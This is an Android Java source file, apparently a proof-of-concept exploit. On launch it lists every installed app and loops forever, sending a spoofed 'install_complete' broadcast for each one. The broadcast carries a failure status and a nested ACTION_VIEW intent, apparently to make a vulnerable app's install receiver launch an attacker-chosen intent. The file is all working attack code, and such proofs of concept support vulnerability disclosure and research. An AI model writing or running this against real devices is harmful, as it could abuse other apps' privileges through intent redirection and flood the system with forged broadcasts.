package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.net.Uri;
import android.os.Bundle;

import java.util.List;
import java.util.stream.Collectors;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            List<String> installedApps = getInstalledApps();

            Intent broadcastIntent = new Intent("install_complete");
            broadcastIntent.putExtra("android.content.pm.extra.STATUS", -1);
            broadcastIntent.putExtra("android.intent.extra.INTENT", new Intent(Intent.ACTION_VIEW, Uri.parse("https://google.com/")));
            while (true) {
                installedApps.forEach(app -> {
                    broadcastIntent.putExtra("android.content.pm.extra.PACKAGE_NAME", app);
                    sendBroadcast(broadcastIntent);
                });

                try {
                    Thread.sleep(1000);
                } catch (Throwable th) {
                    throw new RuntimeException(th);
                }
            }
        }).start();
    }

    private List<String> getInstalledApps() {
        try {
            return getPackageManager()
                    .getInstalledApplications(0)
                    .stream()
                    .map(app -> app.packageName)
                    .collect(Collectors.toList());
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}